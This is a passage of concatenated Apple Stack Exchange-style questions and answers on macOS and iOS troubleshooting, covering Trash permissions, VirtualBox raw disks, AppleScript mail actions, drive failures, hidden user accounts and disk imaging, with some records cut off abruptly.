But, trash won't work again just after 1~2 hour.\n\n\n*\n\n*(Permission of Trash on iCloud Drive is not affected-which means I can still remove files on iCloud Drive to trash.)\n\n\nWhat I tried\n\n\n*\n\n*sudo rm -ri ~/.Trash\n\n*remove and recreate .Trash on the iCloud path too.\n\n*use 'Appy enclosed items...' from home folder.\n\n*just don't use any kinds of 'optimization app' or 'cleaner app.'\n\n*reinstall clean macOS.\n\n*use disktuil on an internal drive and external drives.\n\n\nMaybe...\nI guess the problem comes with Time Machine backup, but I don't know why.\nBecause I found that, whenever Time Machine auto-backup starts and done, next time I boot the mac, it happens again.\nIt happens for both wired external Time machine drive and wireless drive on Nas, and it happens even I clean up the external drive and restart Time machine from the empty drive.\n\nA: I solve the problem by checking which process use .Trash path by lsof | grep ~/.Trash\nI found that the background service of VyprVPN app use /.Trash (still I don't know why). So I clean up VyprVPN app. Problem solved.\n", "Q: Match the Creation Date of 2 sets of files with same name I've just converted hundreds of AIF recordings from a few days ago to WAV, but I need the newly created files to keep the original Creation Date of the recordings. Filenames are identical apart from the extension, stored in two separate folders. \nIs there a way to batch modify each WAV's Creation Date to match its respective AIF?\nThanks!\n\nA: Assuming a folder structure like\n./\n+--AIFFolder/\n+--WAVFolder/\n\nand also assuming that the WAV files end in .wav you can use\ncd AIFFolder\nfor f in *; do\n    date=$(stat -f %SB -t %Y%m%d%H%M \"$f\")\n    base=${f%.*}\n    touch -t $date ../WAVFolder/\"$base\".wav\ndone\n\nThis can be simplified (thanks for the hint, @fd0) to\ncd AIFFolder\nfor f in *; do\n    touch -r \"$f\" ../WAVFolder/\"${f%.*}.wav\"\ndone\n\n", "Q: How can I get iTerm out of fullscreen mode? I must have hit some keystrokes which got me stuck in full screen mode and there are no resize icons when you hover mouse at top of screen even though the task bar shows up.  How do I get out of full screen without restarting iTerm?\n\nA: This was probably how I got stuck there in the first place.  You can toggle full screen mode with the ⌘ Command⏎ Enter keyboard shortcut.\n", "Q: Performance comparison iOS 12 / iOS 11? After I upgraded to iOS 11 on an iPhone 6, I noticed different forms of performance loss:\n\n\n*\n\n*lag to start some applications,\n\n*interface buttons which seems like on slow motion,\n\n*virtual keyboard starting to display the characters I typed after 3 to 4 of them,\n\n*lag in web browsing (but a part of the problem might come from the network interface in use and the load of the connection and the remote server,\n\n*etc…\n\n\nBefore switching to iOS 12 (which we can test to check), I would like to take advantage of this upgrade to make a correct performance measure of iOS 11 so as to be later able to compare it with the performance of iOS 12.\nI would like to measure a number which is network independant and processor independant so as to be able to compare iOS version performance only. Of course an OS performance can’t be fully characterized by a uniq number. For example one OS might be faster on files manipulation, when the other might be faster in graphical interface rendering. But as unperfect as it is, it is always possible to compute a weighted average of performance along different key functions.\nI had a look at some great benchmarks like Geekbench but most of them are focused on giving numbers which characterize the processor performance and not the OS one. For example, Geekbanch doesn't provide the iOS version on which the benchmark was run.\n\nWhich benchmark would provide a performance “indicator” to characterize the OS helping to compare iOS 11 and iOS 12 performance. Of course on same physical architecture, within the same networking environnment & with the same OS load?\n\nA: To my knowledge, no such measure exists.\nIt is virtually impossible to say anything about the performance of an operating system that is fully independent on the processor and network. It really doesn't make much sense.\nYou can create benchmarks that measure the performance of \"real life things\", which includes stuff the operating system does - but you wouldn't be able to compare the OS performance across different processors and network devices.\nIt would make more sense to create a benchmark that tries to focus on operating system operations - trying to spend as much time in the OS as possible and as little in user code. Then you could compare that benchmark value to the same benchmark value on the same exact device (i.e. same processor, etc.) but with a different OS version.\nThis would tell you a little bit about the OS performance, but it would be very hard to create something that you gives you 1 abstract number that represents the OS performance in a meaningful way. It would depends very much on heuristics and how you want to weigh the performance of each of the many thousands things the particular OS does for you.\nFor example if iOS 11 is 20% faster at creating threads compared to iOS 12, but iOS 12 is 20% faster at compressing video - which one is the fastest?\nIf you never compress video, you might say iOS 11 is the fastest, but others might have a different opinion.\n\nA: One way to measure this is to do the same tasks on the phone, video to measure exactly how long it takes, and compare the videos.\nOthers have already done that with two phones side-by-side. Here are two examples on YouTube:\niOS 11 vs 12 speed test on an iPhone 6\niOS 11 vs 12 speed test on an iPhone 8\n", "Q: How can I run Windows in a VM using VirtualBox?

I'm on MacOS 10.14 (Mojave).\n\nA: Most users wishing to do what you want to do purchase VM Fusion or Parallels.\nVirtualBox is not really designed for what you are trying to do. Think of what would happen if you were to clone your Windows partition to another entirely different PC. You should not expect Windows to boot because you did not copy any boot code to the new PC. If you were to fix this problem, then you should expect there to be problems with the fact that the hardware peripherals would be different. I suppose you could have generalized Windows before the copy, then installed new drivers after booting Windows on the new PC, but generalization was not meant to be performed after Windows is in use. Anyway, this what you are attempting to do by booting a Boot Camp install of Windows in VirtualBox.\nBelow are some items you may need to worry about.\n\n\n*\n\n*You have no boot code. You can use the Windows ISO file to create boot code, but the procedure depends on whether you are going to BIOS or EFI boot.\n\n*You have not mentioned if VirtualBox is set to boot the same way. In other words, will you need to BIOS or EFI boot in VirtualBox?\n\n*You may need to run \"C:\\Windows\\System32\\sysprep\" to generalize before booting in VirtualBox. \n\n\nI assume you entered the commands given below.\nsudo VBoxManage internalcommands createrawvmdk -filename \"windows.vmdk\" -rawdisk /dev/disk0s3\nsudo chown mike:staff windows.vmdk\n\nI would have entered the commands given below.\nsudo vboxmanage internalcommands createrawvmdk -filename \"windows.vmdk\" -rawdisk  /dev/disk0 -partitions 3\nsudo  chown  $USER  windows*.vmdk\n\n\nNote: You will need to enter the command diskutil unmount disk0s3 immediately before starting the virtual machine.\n\n\nA: Disks are always inaccessible as normal users. This is as a security measure. Often the simplest solution to this is just to run VirtualBox as root (which is what I usually do). You can do this with a variety of commands, including sudo open -a virtualbox. Note that the VMs for root aren't synced with those of your user.\n", "Q: AppleScript add new filename and path in mail only when files extension are .pdf and .doc I have a Mac running macOS Mojave.\nthis script sends a mail to multiples user when someone adds a new file in my folder.\nHow can I add the filename in the mail Subject and the path file in the mail body?\nHow can I apply this action only when the file extension are .pdf or .doc?\nhere is my script:\nproperty dialog_timeout : 30 -- set the amount of time before dialogs auto-answer.\n\non adding folder items to this_folder after receiving added_items\ntry\n    tell application \"Finder\"\n        --get the name of the folder\n        set the folder_name to the name of this_folder\n    end tell\n\n    -- find out how many new items have been placed in the folder\n    set the item_count to the number of items in the added_items\n    --create the alert string\n    set alert_message to (\"Folder Actions Alert:\" & return & return) as Unicode text\n    if the item_count is greater than 1 then\n        set alert_message to alert_message & (the item_count as text) & \" new items have \"\n\n    else\n        set alert_message to alert_message & \"One new item has \"\n    end if\n\n\n    set recipientName to \"New file added\"\n    set recipientAddress to \"user1@gmail.com, user2@gmail.com\"\n    set theSubject to \"new file\" & fileName\n    set theContent to \"¡Hello! new file added: pathName fileName\"\n\n    tell application \"Mail\"\n\n        ##Create the message\n        set theMessage to make new outgoing message with properties {subject:theSubject, content:theContent, visible:true}\n\n        ##Set a recipient\n        tell theMessage\n            make new to recipient with properties {name:recipientName, address:recipientAddress}\n\n            ##Send the Message\n            send\n\n        end tell\n    end tell\n\nend try\nend adding folder items to\n\nI try many times to use this example, but was impossible:\nApplescript to return name of new file added to folder\nThanks so much in advance!\n\nA: This works for me using the latest version of macOS Mojave.\nI made some adjustments for you and added a few items to your code.

I had bought a WD My Book Thunderbolt external RAID. I didn't have a backup plan of course; it failed within a year, and I lost everything—this was about a year ago.\nI went out and bought two 8TB Seagate Expansion Desktop Drives, one as my main storage, and one for backup. I signed up with Crashplan, a service that would backup my files to it's cloud as well as do the job of backing up to my local external backup drive.\nA couple of months ago the backup drive died. Within the same week one of my wife's external drives died. \nI invested in a Synology NAS and set up a RAID 6 to throw all my files onto, with plans to attach a 2nd external drive to back up the NAS—but of course, before I get a chance to back up my main Seagate drive to the NAS, my Mac is telling me it has a problem (unfortunately I didn't write down what it said), that it has been set to read-only, and I need to back it up before it fails completely. \nIt feels like this is happening a bit too often to blame on \"Well sometimes ya just get a bad one!\", and I'm wondering if I am overlooking other factors?\nCould it be an electrical issue? My house is about 120 years old, but we had the knob & tube wiring replaced when we moved in and a new breaker box installed. All my computer hardware is plugged into a couple surge protectors which are in turn plugged into a UPS batter backup/surge protector. \nCould there be a problem with my computer, doing something to the hard drives to mess them up?\nAm I just overusing or overfilling the drives? My work is in graphic design, photography, and video editing, so I'm typically working with some big files, lots of caches, etc. Also I know when Crashplan was backing up to that one external it was telling me it was nearly full. Perhaps I need to be running First Aid on the drives, or rebuilding the directories with Diskwarrior on a regular basis?\n\nA: \nIt feels like this is happening a bit too often to blame on \"Well\n  sometimes ya just get a bad one!\", and I'm wondering if I am\n  overlooking other factors?\n\nYes!\nBased on what you're doing, your using your drives not as a typical home user but more of a \"pro\" and you should be getting the hardware to match.  Most consumer (especially the entry level drives) have lower MTBF (Mean Time Between Failures) numbers - higher is better - than their \"workstation\" or \"NAS class\" drives.  The higher end models also have longer warranties - typically 3 to 5 years.\nThere are some additional factors you may wish to consider:\n\n\n*\n\n*Seagate drives are notoriously unreliable.  WD drives are better, but the really reliable ones are made by HGST.\n\n*Look to get a Thunderbolt enclosure, rather than a \"consumer grade\" USB drives.\n\n*Populate your Synology with NAS rated drives.  They are designed to run longer, cooler with greater reliability.\n\nCould it be an electrical issue? ... All my computer hardware is\n  plugged into a couple surge protectors which are in turn plugged into\n  a UPS batter backup/surge protector.\n\nA battery backup is also a surge suppressor/protector so daisy-chaining one to the next is not a good idea - you could be creating issues if/when there are surges.  If you must add ports to your battery backup, use a power strip, not a surge protector.\nYour Backup Strategy\nIt sounds like you're off to a good start with your backup strategy.  Here's a few points to consider:\n\n\n*\n\n*Having RAID is good, but don't depend on it for backup.  RAID is designed to maximize data availability (up time), not be a backup. \n\n*The two USB drives attached to the RAID is a good idea.  However, you should be alternating backups between the two.  One for \"odd\" days and the other for \"even\".  This will require you to have to different backup jobs but it ensures your data is backed up to two different locations.  Also, to ensure you don't backup corrupted data....\n\n\n*\n\n*Don't backup the backup!\n\n*Backup the actual data only!\n\n\n*Adding Crashplan is also an excellent idea.  Having this backup your files to an offsite location is a very smart thing to do.  Having a regimented backup workflow will ensure your access to data even if your NAS and both backup drives are inaccessible.\n", "Q: Is it a good idea to run MacOS off of a flash drive? I have an old 2013 iMac and it is very slow because the hard drive is corrupted. I want to replace the hard drive with a new ssd, but before I do that I want to see how the computer would run with an ssd. Unfortunately, I don’t have any free ssds laying around to install macOS on, so I am wondering if using a flash drive would work well and as smooth as an ssd as long as I left enough room available? \n\nA: Yes and no, Let me elaborate. Most USB 3.0 drives could run it almost as good as an hdd, If you have a SSD, that would be the best option and is usually faster than the hard drive the comes with any mac. Usb 2.0 can technically work but is very slow as the read/write speeds aren't the best. Im currently running mac os x 10.11.6 on a usb 3.0 flash drive i got from walmart for $17. I will mention however, that the newer OS your using, The slower it will be on os x. I still think that USB booting is great though because of the portability. Just install the OS on the usb flash drive, and hold down alt at startup and it should work perfectly fine. If you have any questions or want me to make you a bootable image for your flash drive, hmu.\n\nA: We can’t know the speed of your flash drive. Now any storage is better than no mac running, so go ahead and give it a shot, but “best” depends on your needs and expectations. Details like bus interface, drive controller and flash media you buy matter greatly. If you are looking to spend money on an external drive to be sure the value per performance is acceptable. There are vast differences in options that fit under the “external flash”  umbrella.\n\n*\n\n*NVMe m.2 via ThUnderbolt / USB 4 would be a very good choice if you cared about speed.\n\n*https://www.tomshardware.com/news/owc-launches-thunderbolt-3-m2-nvme-ssd-enclosure\n\n*Micro SD via USB would be a very good choice if you cared about small size and low price.\n\n*https://www.bhphotovideo.com/c/product/1431026-REG/sandisk_sddr_b531_an6nn_mobilemate_usb_3_0_card.html\n", "Q: Child's account as default login user I'm a complete newbie at macOS. \nBought a new MacBook Air for my eight year old child as that is what the school specified.

But I can't figure out how to make it a local account, or if that is even part of the issue?\n\nA: Hide a User Account in macOS\nThis works in OS X Yosemite (10.10 and newer). The general syntax to use to hide an account is as follows, replacing admin with the user home directory of the account to no longer display:\nHiding from User Menu\nFor example, to hide the user account “admin” on a Mac with the given user directory being /Users/admin, the syntax would be:\n$ sudo dscl . create /Users/admin IsHidden 1\n\nthen reboot for the change to take effect.\nHiding in Finder\nYou can move the hidden user's home directory to a place that's not visible from the Finder. And you can remove the hidden user's Public Folder share point.\nThis command moves the home directory of \"admin\" to /var, a hidden directory:\n$ sudo mv /Users/admin /var/admin\n\nThis command updates the user record of \"hiddenuser\" with the new home directory path in /var:\n$ sudo dscl . create /Users/admin NFSHomeDirectory /var/admin\n\nThis command removes the Public Folder share point for the user with the long name \"Hidden User”:\n$ sudo dscl . delete \"/SharePoints/Admin's Public Folder\"\n\nUnhiding\n$ sudo dscl . create /Users/admin IsHidden 0\n\nChanging the number from 1 to 0 changes the hidden status of the account. You must reboot for changes to take effect.\n\nSource:\nhttps://support.apple.com/en-us/HT203998\n\n\nA: It sounds like the initial login screen is not a login screen at all, but the \"decrypt\" screen. It sounds like your drive is fully encrypted, and so it needs your password right away when you power up the machine so you can boot.

Hoping you all might be able to shed a helpful light on things.\nThe MBP in question is circa 2012 and immediately boots to the OS X Base System on startup. When going through the 'Reinstall Max OSX' option (High Sierra, in this instance) I'm able to proceed past the license agreement but lack any disk volumes besides the Base System (which I clearly can't override). Additionally, the base system itself seems to take up roughly 350 GB of the total 500 GB hard drive. \nWhen moving through Disk Utility options I am only able to run a First Aid check or Partition both the OS X Base System and the internal Hard Drive (a Toshiba MK5065GSXF HDD).

Additionally, the OS X Base System now registers as being 500 GB in size in this menu. \nSo,long story short--the hard drive seems borked. If anyone has any ideas on what I might try next, I'm all ears. Otherwise, this little dinosaur may end up being recycled. \n\nA: Don't let that poor dinosaur extinct yet.\nNow I'm sorry but I'm not sure what you are referring to with 'base system' that's taking up 350GB. Assuming that it's the recovery partition, was that already in the drive? It sounds like partition map is broken. \nIf you are willing to wipe that hard drive clean, there are few things you can try.\nErase the disk using terminal in recovery mode and run verifyDisk and repairDisk. If this works then you could probably just create new osx extended partition to install osx. \nIf partition map is broken, you could use external computer to repair them using third party software. \nAnd since you mentioned that it's a MBP from around 2012, does it have an optical bay? if your model is the ones before retina screens, there is a high chance of broken SATA cable. It is a known issue with MBP from those times, and it breaks quite often, leading to very confusing hard drive problems. If possible check if hard drive works fine on other computers and if they do, it is likely that it's your SATA cable. \n", "Q: How to delete an extra app on my iPhone 5s and return to just the icon on my screen?

The Mac itself is running macOS 10.14 \"Mojave\".\nThe simplest thing to move would be the Photos.app library as that can be done by just option-launching the program and selecting the library on the external, however the library is too large (around 300GB), and constantly growing, so that is not an option. Splitting the library into two is an option but then involves futzing with two libraries, and working with images in two libraries is not very well supported by Photos.app.\nEmail storage on the other hand is just the right size! However I am unsure exactly which folders are important, and the best way of providing the linkage so that everything works properly and is not frequently broken.\nThe following folders in the ~/Library folder seem to be Mail.app related:\n~/Library/Mail\n~/Library/Mail Downloads\n~/Library/Containers/com.apple.mail\n\n~/Library/Mail Downloads seems to be old with nothing inside it dated after 2013 - I gather that sometime in the 10.9 Mavericks era this was moved to inside ~/Library/Containers/com.apple.mail folder, so it can probably be ignored or even deleted after I look through it to make sure there is nothing of value inside.\nSo that leaves the two other folders. If I copy them to\n/Volumes/external-drive/Mail-Storage/Library/Mail\n/Volumes/external-drive/Mail-Storage/Library/Containers/com.apple.mail\n\nand then make symbolic links at the expected places in the ~/Library folder will everything continue to work properly?\nWould macOS aliases be preferred over Unix symbolic links? I think that if the name of the external-drive is ever changed, the symbolic links will break but macOS aliases would continue to work. The downside to an alias is that some lower-level Unix stuff does not know how to deal with the macOS alias. With that said, it looks like ~/Library/Containers/com.apple.mail is filled with all sorts of macOS alias files, so Mail.app does seem to be able to handle all of those.\nThis discussion Access to ~/Library/Containers/com.apple.mail/Data/ denied makes me think that Mojave's \"entitlements\" might make it challenging to move the entire ~/Library/Containers/com.apple.mail folder. Perhaps I should move the ~/Library/Containers/com.apple.mail/Data/Library/Mail Downloads folder instead, since it seems to contain the majority of the data in the ~/Library/Containers/com.apple.mail folder.\nSo my inclination is to copy the two folders\n~/Library/Mail\n~/Library/Containers/com.apple.mail/Data/Library/Mail Downloads\n\nover to\n/Volumes/external-drive/Mail-Storage/Library/Mail\n/Volumes/external-drive/Mail-Storage/Library/Containers/com.apple.mail/Data/Library/Mail Downloads\n\nand replace the local folders in ~/Library with macOS aliases to the folders in /Volumes/external-drive/Mail-Storage/Library/.\nOne extra thing to do is to make sure that the alias at\n~/Library/Containers/com.apple.mail/Data/Library/Mail\n\nwhich normally points to the folder\n~/Library/Mail\n\nproperly resolves to the folder\n/Volumes/external-drive/Mail-Storage/Library/Mail\n\nwhich it might not do if it is not corrected.\nFinally, for recent macOS System security policy, Mail has no right to read and write on an external disk unless it is authorized in System Preferences > Security and Privacy > Privacy > Full disk access (or is there a way to just give it access to \"Removable Volumes\" rather than everything?)\nIs that the best way to do this? Have I missed any issues?\nI guess I should encrypt the external-drive so the data is safe if someone walks off with the device using either the Finder to encrypt all the data currently on the device, or using Disk Utility.app to reformat the device with encryption - details on both are here among other places.\nThanks in advance for any insights you can offer.\n\nA: Photos\nhowever the library is too large, and constantly growing, so that is not an option.\nI don't understand the reasoning behind this. I assume you have more storage on your external drive than your internal drive. It's the perfect thing to move.  New photos should be added to the external drive. Here is what apple is saying on the subject.\nhttps://support.apple.com/en-us/HT201517\nMail\nI'd pick ln command so macOS above the Unix layer will not know that you moved the folders. \nSymbolicLinker is a tiny contextual menu plugin that, once installed, allows any user to create symbolic links to files inside the Finder.\nencryption \nIs up to you.  It's harder to recover data that's encrypted.  Your data is less protected.  You have to evaluate what your data is worth out in the wild.  I never take my computer outside my house, so it's as safe as all my other stuff. I have an off site backup too.\nbackup\nDo not forget to backup all you external data. \n\nA: If you want to save your Mail Library on an external disk, you surely can move the ~/Library/Mail folder to such a disk then make a symbolic link from ~/Library/Mail to your specific new location (such as /Volume/yourdisk/Mail).\nBut that would be not enough, Mail would never be able to start if you did not allow Mail to access all the disks. With the new macOS System security policy, Mail has no right to read and write on an external disk unless you authorized it in System Preferences>Security and Privacy>Privacy>Full disk access.\nIf you do not explicitly give full disk access to Mail, then you would get System Policy: Mail(38010) deny(1) file-read-data for instance and Mail would not have the right to read into the library. Mail would then hang up and you would have no error message to understand what's happening.\n", "Q: Safari URL bar discoloration In Safari (12.0.3 and probably earlier) the URL bar can have an element of discoloration.

I completely erased the hard drive with Disk Utility and reinstalled os 10.12.6.

Such as \"An account is required to use the app. Visit www.example.com to register.”\nI'd love to hear from those experience with getting apps published bot circumventing the 30% payments to Apple.\n\nA: Speaking from some experience -- Apple is pretty strict about this requirement, and will not look kindly on attempts to circumvent it.\n\nDo I just put a login screen on the app and then text below it that says \"An account is required to use the app. Visit our website to register”\n\nApple will probably object to the language \"visit our website to register\", and may additionally reject your application because it is nonfunctional without an account.\nApple has been known to make some exceptions -- for example, Netflix requires a login and has no in-app signup. This is likely to be a special case, though; it's unlikely that you'll be able to have the same rules applied to your app.\n\nAlternatively, can I put an actual link there as long as it's not to a shopping cart page? Such as \"An account is required to use the app. Visit www.example.com to register.”\n\nNo. Any link which can be followed to a signup page -- even if it's a circuitous path, e.g. a link to a terms-of-service page which links to a support page which links to your home page which links to a signup page -- may be used as grounds to reject your app.\n\nA: The company I worked for has an iPad app as a client for their paid web service.\nIt basically just shows a login screen, so if you don't have an account registered over their website, you can't use the app.\nIt's a relatively small company and the app got approved.

Then your log in screen is truly value added to the free app.\nThen people that want to log in will ask support or just go to your web site where you are free to advertise your paid services / add on benefits. \nThink of it like this, you only pay 30% for year one and 15% thereafter if you want the code and links supplied in the reviewed app to handle the signups.

It was too slow, so I reinstalled the OS. After the installation it appeared to work fine. However it has a strange behaviour. If I try to open Safari it loads instantly, but if I press to update software button it gets blocked and I need to shut down from button. After that it does not even boot anymore.\nAs I thought it was a hard drive problem I installed a SSD. Now the system runs faster but it gets blocked if I press to update or system preferences for example. I think it can be a software problem, because some things work good and other not. \nPerhaps it is because I am trying to install a very old OS. Snow Leopard 10.6.3.\nPlease any suggestions is highly appreciated and if anyone faces the same problems please share your solution.\nThanks a lot.\n\nA: Apparently, the problem was that with Snow Leopard Safari has an old version that crashes. To update the system the best solution is to create a bootable USB image with MacOS El Capitan and it is very easy to install El Capitan. However, the most difficult thing could be to get El Capitan image.dmg.

So here is a hypothetic scenario:\nI'm at work presenting something to a colleague and we are both looking at my screen, when suddenly I have to access a service that requires a password. I use 1Password as my password manager, so I hit the key to autofill the password and when 1Password prompts me I will use Touch ID to identify myself. But here is the deal - things went a little fast and I did not notice that 1Password was expecting my to type a password and not use Touch ID and when I pressed the Touch ID button Mac OS would instantly switch to my \"private\" user and resume my \"movie watching session\" from last night, providing a greatly amusing experience to my colleague and less so for me.\nHow do I disable this stupid feature without actually disabling the ability to sign in with Touch ID? I'm perfectly happy with doing a few mouseclicks when switching user, but I fill in passwords many, many times a day and I'm not interested in being switched to my secondary user by mistake.\nI've checked the system preferences panes for Touch ID and users and found nothing.\n\nA: It’s not possible to just disable Fast User Switching with Touch ID without disabling unlocking with Touch ID. However, it should be noted that the action of switching user with Touch ID is with a press of the Touch ID button, whereas a fingerprint read for the purpose of providing authentication is with a rest of your finger.\n\n\n*\n\n*When prompted for Touch ID for authentication, such as by 1Password or a system dialog, rest your finger on the Touch ID button. Don’t depress the button.\n\n*When you want to use Fast User Switching, when no prompt for authentication is present, press down and click the button with your finger on Touch ID.\n\n\nThese are two distinct actions, with the former performing no action if there is no active prompt for authentication requiring Touch ID. Therefore you won’t inadvertently perform a user switch.\n", "Q: How to stop macbook spotlight from showing internet website and dictionary? I just want to search files in my computer.

First up, you obviously need to create a mac partition on the computer. Next, you will need to find a copy of macOs (obtainable via Mac App Store by all mac users, hence you only need to find a mac owner willing to give you a copy) and convert it into a bootable USB drive. Next, you have to boot into the mac partition on your computer and install macOS via the bootable drive.\n", "Q: Copy \"Artist\" into \"Album Artist\" in iTunes? In iTunes, Is there a way to automatically populate the \"Album Artist\" metadata with the \"Artist\" information, for all songs where the \"Album Artist\" field is empty?\nObviously this is for songs from various artists.

I have crappy Wi-Fi and want to use my iPhone as a Wi-Fi hotspot for my MacBook, but the iPhone seems to be connecting to the crappy Wi-Fi rather than cellular.\nHow do I force it to use cellular?\n\nA: Simply turn off the Wi-Fi on your iPhone, and share your cellular connection through USB cable from your iPhone to your Mac.\nIf you don't otherwise need the crappy Wi-Fi network you have, just turn it off, most probably on your Internet connection router.\nTo improve the quality of your wireless environment, and if you don't use it to access your iPhone, I advise you to turn off Bluetooth on your iPhone too.\n", "Q: How can I recover a Mac-formatted external hard drive? My girlfriend has an external hard drive with a bunch of photos on it from her Mac. She needed to transfer the files to her PC but we soon discovered that Macs and PCs use different formatting standards for hard drives. Initially, after plugging in the external hard drive to the PC, I ran diskmgmt.msc to make sure the computer was seeing it (since it wasn't showing up under My Computer), and indeed it did - but Windows prompted me to specify which type of file system it was. I don't remember exactly what the two options it presented were but I chose whatever the default option was. I believe it started with a G. It was only later that I learned I'd have to use third-party software to do it.\nNow I'm worried that by simply telling Windows to choose one of those two file systems, it may have actually made some real changes to the disk's partition scheme, rendering it a brick. Because now when we go back to plug the drive into the Mac, this message pops up:\n\nThe disk you inserted is not readable by this computer.\n\nIs it possible that Window's disk manager actually changed the partitions when I told it to expect a certain type of file system? Is there any way I can get this drive working on a Mac again?\n\nA: \nWindows prompted me to specify which type of file system it was...\n\nWindows disk management console doesn't ask you to tell it what type of file system it, it asks you what file system you want to write to it.  \n\nIs there any way I can get this drive working on a Mac again?\n\n\n\n*\n\n*Don't attempt to write anything to the disk\n\n*Duplicate the drive to an image on her Mac (it doesn't matter if it's readable or not) using the following command where X is the drive identifier of your source (corrupted) drive. \n  $sudo dd if=/dev/rdiskX of=~/Desktop/USB_Drive.img bs=1m\n\n\n*Using a tool like Disk Drill or Disk Warrior, see if data can be recovered.  It's free to diagnose, but you'll have to purchase a license to actually recover the data.\nYou don't have to make an image - that step is optional.  However, if you attempt to make changes and it fails, you still have the original from which to make another image and try again.\n\nA: Windows cannot read HFS+. You need to either get third party drivers (like Paragon HFS+) for it or use a Mac. If you did format your disk, your data is gone. There's no such thing as telling Windows to expect a filesystem; you probably formatted it. If you only assigned a letter to it, the data should still be intact.\n", "Q: What does \"No Service\" or \"Searching\" mean on iPhones? I am new to iPhones and iOS. Since the update to iOS 12.1.4 my mobile connection breaks from time to time (seems to be a known issue) and \"No Service\" is shown at the top left of my display. I am not exactly sure what it means.\nPreviously, I used a BlackBerry Passport with BB OS10. There were two different information symbols for connection issues (with respect to mobile networks): a red cross indicating that no connection to any network is possible and another sign indicating that no connection to my provider's network is possible. If the second symbol is shown, I can make emergency calls (because there are other networks available). If the first is shown, I cannot do emergency calls.\nNow, I am wondering what \"No Service\" means in iOS: no connection to any provider (no emergency calls) or no connection to my provider (emergency calls possible). My guess is that \"no service\" means the first and \"searching\" means the second. Is that correct?\n\nA: No service means no calls are possible as you have no network,\nSearching means no calls are possible and it is searching for your service set-up via your SIM card and Settings.\n", "Q: MacBook Pro won't boot from USB installer or go into recovery. Tried everything Hi I have a MacBook Pro (15-inch, Mid 2012) that won't boot using any method.\nAround 6 months ago, the mac started making loud scratching sounds, but they stopped after a day or so. However, a few days later the mac suddenly froze and then shut down automatically. When attempting to boot, it would reach the Apple logo and fill the progress bar half-way before restarting. This would happen several times in a row before it would finally boot. Then the computer would function normally for a while before the whole process (but no sound this time) would happen again.\nWhen it did turn off, the screen would sometimes fill with rainbow colored bands and any sounds playing would get stuck with one note playing over and over, sounding like a stuck vinyl record. Then when it would get to the half-way loaded point, it would suddenly shut down and restart. It would take luck to finally get to the password screen.\nI wiped the hard drive and this solved the problem for a few months. No issues at all. But then back in December it started having the same problems (again, no more sound, just the sudden shut downs and difficulty booting). I was set to wipe the disk again, but this time it refused to boot entirely, no matter how many times I tried restarting and waiting.\nIt's been a few months since then and nothing has changed. I bought an external hard drive and a USB flash drive in an attempt to boot from a different source than the internal drive. Here is what I have tried and what the results are:\n\n\n*\n\n*Reset the NVRAM and SMC. Successfully reset, but had no effect.\n\n*Try to use Recovery Mode and Internet Recovery Mode. The spinning globe appears, asks me to enter the wi-fi password, then the progress bar completes. The globe goes away and then the screen remains gray but hangs there indefinitely. The options for Disk Utility, Reinstall OS, etc never appear.\n\n*Install OS X Lion from a different Mac on to external hard drive and attempt to boot from there. The Apple logo appears, the progress bar fills up half-way, then the screen turns black, before it turns blank gray. It hangs there indefinitely.\n\n*Download OS X El Capitan installer on USB drive and use terminal to run createinstallmedia and attempt to go into recovery from there. Same result as above. Currently staring at the blank gray screen as I type this.\n\n*Boot from Recovery HD. Same result as above.\n\n*Boot as a Guest User in Safari-Only Mode. Same result as above.\n\n*Launch into Safe Mode. No error messages found.\n\n*Run Apple Hardware Test. I ran the extensive test, but no issues were found with the hardware.\n\n\nSo I've tried all of these methods and I can't even get to Disk Utility or any other options. I don't care if I lose all the data on the old hard drive, I just want to be able to boot from the external drives or at least get to the point where I can run Disk Utility. What could be wrong with the computer?\nTL;DR : MacBook Pro 2012 can't boot into recovery from internet, USB drive, or external hard drive. Gets to Apple logo and then either shuts down or hangs on a blank gray screen indefinitely. Help!!!\nOther Info: I don't have TimeMachine backups. All the methods I've listed work on the second mac so I'm not entering any commands wrong. When charging my iPhone, if I attempt to boot from the internal drive, the phone will stop charging for a few seconds as the progress bar fills up before resuming charging. \nThank you for any help you may have. It is really appreciated.\n\nA: I would add this as a comment, but I don’t have enough reputation...\nDid you use cmd+R for internet recovery?\nThe reason I ask is that I’m currently going through a similar problem with my 2011 MacBook Pro. My bootable USB installer failed when attempting a clean install. I tried internet recovery using cmd+R, but that failed too.\nBy using the advice in this post by boris42 to use cmd+opt+R, I was able to enter internet recovery mode and I am currently installing Lion (the only option available), and will upgrade further from there.\n", "Q: Garage Band live transposing MIDI input I have a MIDI instrument whose input I'd like to transpose live (ie. so the sound synthesized for it is transposed up a third from the actual input, for example).\nI tried adding an AU Pitch Shift effect plugin to the track. This does allow me to do the transposition. But, since this effect works on the output audio signal and not the MIDI input (and does so in software) it is noticeably laggy (to the point where playing is annoying).\nI did some investigation and found this article: https://discussions.apple.com/thread/2426268. It's old (2010), but it discusses using MIDI Patchbay to create a fake virtual MIDI input with the transposition. The problem the OP faced there was that Garage Band still picked up the initial untransposed MIDI input (because it listens to all MIDI inputs for the current track; this seems to still be the case as I confirmed this by trying two MIDI instruments simultaneously). Since this question is older, do recent versions of Garage Band allow you to filter out certain MIDI tracks (making this approach possible)?\nIdeally, I'd like to do the transpose live from within Garage Band. I also found in the editor (under score) the \"Transpose\" option (which for some reason is disabled under \"Piano Roll\"). However, this doesn't seem to have an effect on the live input.\ntl;dr Is there a way to live transpose MIDI input that you are synthesizing/monitoring through Garage Band?\n\nA: I was looking at the exact same problem, and I found a solution: Milky. It's on the Mac App Store, it also runs on M1 Macs, and the free (non-Premium) version does exactly what you need.\nhttps://apps.apple.com/us/app/milky/id1455001521?mt=12\nIt creates a \"virtual\" MIDI device that will look to any DAW (including Garage Band) just like your physical keyboard – except that it will take your regular keyboard's input on one end, modify it, and then push it out on its other end.\n\nI'm currently playing on my Akai LPK25 Wireless, Milky transposed my keys up 3 halftones, and my \"DAW\" is another free app named \"Quick MIDI\".\nhttps://apps.apple.com/us/app/quickmidi/id1459790045?mt=12\n\nAs I said, this is running on my Apple Silicon M1 Mac. I don't notice any lag at all, as this is done on MIDI notes, not on digital audio.\n\nA: Actually, MidiPipe does the same job, and I find it more versatile:\n\nhttp://www.subtlesoft.square7.net/MidiPipe.html\nThe latest version 1.6.2 also runs nicely on M1 Macs. After download and unpacking, you'll need to run the app once with your right mouse button / Open.\n", "Q: The macOS installation I never prompted, couldn't be completed My MacBook Pro is running High Sierra at the moment and I have been pretty bothered by the Mojave notifications in last weeks, which I have always ignored because I don't want to update at this 